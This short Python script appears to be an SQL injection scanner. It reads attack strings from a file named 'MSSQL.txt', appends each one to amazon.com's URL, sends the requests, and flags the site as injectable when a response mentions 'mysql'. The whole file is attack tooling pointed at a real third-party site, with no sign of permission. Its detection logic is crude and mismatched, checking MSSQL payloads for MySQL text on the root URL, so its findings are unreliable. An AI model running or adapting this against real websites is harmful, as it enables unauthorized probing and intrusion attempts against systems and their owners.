#Kyle Pendleton
#04/11/2024
#This will test if the site is vulnerable to SQL injection

import requests

website = "https://www.amazon.com/"

mysql_attack = []

# open file and read the content in a list
with open('MSSQL.txt', 'r') as filehandle:
    for line in filehandle:
        attack_mysql = line[:-1]
        mysql_attack.append(attack_mysql)

for attack_mysql in mysql_attack:
	print("Testing... "+ website + attack_mysql)
	response = requests.get(website + attack_mysql)
	if "mysql" in response.text.lower():
		print("Injectable MySQL detected")
		print("Attack string: "+attack_mysql)